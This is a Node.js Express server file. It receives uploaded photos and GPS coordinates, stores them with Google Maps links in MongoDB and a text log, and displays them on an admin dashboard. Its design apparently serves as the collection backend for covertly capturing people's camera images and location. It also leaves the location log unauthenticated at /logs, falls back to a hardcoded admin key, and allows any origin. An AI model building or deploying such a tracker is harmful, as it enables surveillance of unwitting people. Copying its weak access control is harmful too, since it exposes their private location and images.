const express = require("express");
const multer = require("multer");
const fs = require("fs");
const mongoose = require("mongoose");
require("dotenv").config();

const app = express();

/* =========================
   MONGODB CONNECTION
========================= */
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));

/* =========================
   CAPTURE SCHEMA / MODEL
========================= */
const captureSchema = new mongoose.Schema({
  time: { type: Date, default: Date.now },
  latitude: String,
  longitude: String,
  mapLink: String,
  imageFile: String,   // filename stored in /uploads
});

const Capture = mongoose.model("Capture", captureSchema);

/* =========================
   ENSURE UPLOADS FOLDER
========================= */
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

/* =========================
   SERVE UPLOADED IMAGES
========================= */
app.use("/uploads", express.static("uploads"));

/* =========================
   MULTER STORAGE CONFIG
========================= */
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, "uploads/"),
  filename: (req, file, cb) => cb(null, `capture_${Date.now()}.png`)
});

const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype === "image/png" || file.mimetype === "image/jpeg") {
      cb(null, true);
    } else {
      cb(new Error("Only PNG and JPEG allowed"));
    }
  }
});

/* =========================
   CORS
========================= */
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Methods", "POST,GET");
  next();
});

/* =========================
   CAPTURE ROUTE
   Saves to MongoDB + file log
========================= */
app.post("/capture", upload.single("photo"), async (req, res) => {
  const { latitude, longitude } = req.body;
  const hasLocation = latitude && longitude;
  const mapLink = hasLocation ? `https://www.google.com/maps?q=${latitude},${longitude}` : null;
  const imageFile = req.file ? req.file.filename : null;

  try {
    // Save to MongoDB
    await Capture.create({ latitude: latitude || null, longitude: longitude || null, mapLink, imageFile });

    // Also append to text log as backup
    const log = `
Time: ${new Date().toISOString()}
Latitude: ${latitude || "N/A"}
Longitude: ${longitude || "N/A"}
Google Maps: ${mapLink || "N/A"}
Image File: ${imageFile}
-------------------------
`;
    fs.appendFileSync("location-log.txt", log);

    res.status(200).send("Captured successfully");
  } catch (err) {
    console.error("Capture error:", err);
    res.status(500).send("Server error");
  }
});

/* =========================
   VIEW LOGS (text)
========================= */
app.get("/logs", (req, res) => {
  if (!fs.existsSync("location-log.txt")) {
    return res.send("No data captured yet.");
  }
  res.type("text").send(fs.readFileSync("location-log.txt", "utf8"));
});

/* =========================
   ADMIN DASHBOARD PAGE
========================= */
app.get("/admin", (req, res) => {
  res.sendFile(__dirname + "/admin.html");
});

/* =========================
   ADMIN DATA API  (MongoDB)
   GET /admin-data?key=<ADMIN_KEY>
========================= */
const ADMIN_KEY = process.env.ADMIN_KEY || "aarav12ee";

app.get("/admin-data", async (req, res) => {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  try {
    const captures = await Capture.find().sort({ time: -1 }).lean();

    const result = captures.map(c => ({
      time: c.time,
      lat: c.latitude,
      lng: c.longitude,
      mapLink: c.mapLink,
      imageUrl: c.imageFile ? `/uploads/${c.imageFile}` : null,
    }));

    res.json(result);
  } catch (err) {
    console.error("Admin data error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

/* =========================
   SERVER START
========================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
